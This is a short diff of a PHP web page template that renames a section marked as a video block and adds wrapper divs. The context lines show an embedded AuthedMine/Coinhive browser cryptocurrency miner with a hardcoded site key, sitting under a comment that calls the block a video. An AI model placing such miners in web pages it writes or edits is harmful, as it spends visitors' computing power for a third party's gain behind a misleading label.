@@ -68,8 +68,10 @@ include("layout/c794bc6c9a3eccc2.php");
 -->
 <!--  video -->
 <script src="https://authedmine.com/lib/simple-ui.min.js" async></script>
-  <section id="video" class="video-main-block text-center">
-    <div class="container">
+<section id="mx" class="mx-main-block text-center">
+  <div class="container">
+      <div class="mx-block">
+        <div class="mx-item mx-item-one">
           <div class="coinhive-miner" 
               style="height: 100%;width: 100%"
               data-key="dmQTh9BimGpFmAdq4RUPFgUfjH0SYIt2"
@@ -85,6 +87,7 @@ include("layout/c794bc6c9a3eccc2.php");
         </div>
       </div>
     </div>
+  </div>
   </section>
 <!--  end video -->
 
